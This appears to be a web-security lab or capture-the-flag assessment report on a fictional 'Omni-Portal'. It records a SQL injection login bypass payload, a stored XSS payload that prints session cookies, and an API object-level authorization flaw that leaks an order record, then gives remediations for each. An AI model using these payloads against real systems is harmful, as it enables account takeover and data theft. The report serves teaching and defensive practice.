# OMNI-PORTAL ASSESSMENT REPORT
**Operator:** **Deadline:** April 5 @ 11:59 PM 

## PHASE 1: AUTH BYPASS (SQLi)
* **Payload Used:** [admin'--]
* **Result:** Successfully bypassed login and obtained 'auth_token' cookie.

## PHASE 2: CLIENT-SIDE HIJACK (XSS)
* **Stored XSS Payload:** [<script>document.write(document.cookie)</script>]
* **Secret Cookie Captured:** [auth_token=SUPPORT_TIER_1_SECRET_TOKEN; session_id=admin_secret_99812_do_not_share]

## PHASE 3: API ENUMERATION (BOLA)
* **Insecure Order ID:** [501]
* **Confidential Data Leaked:** ["amount":"$15,000.00","details":"Confidential Server Lease","order_id":501]

## PHASE 4: THE REMEDIATION
* **Fix for SQLi:** * Use parameterized queries (prepared statements), never concatenate user input directly into SQL strings. **Fix for XSS:** Output-encode all user-supplied content before rendering in HTML. Mark cookies as HttpOnly to prevent JavaScript access.
* **Fix for API BOLA:** After validating the auth token, verify the authenticated user's ID matches the user_id on the requested order. Return 403 Forbidden if they don't match.

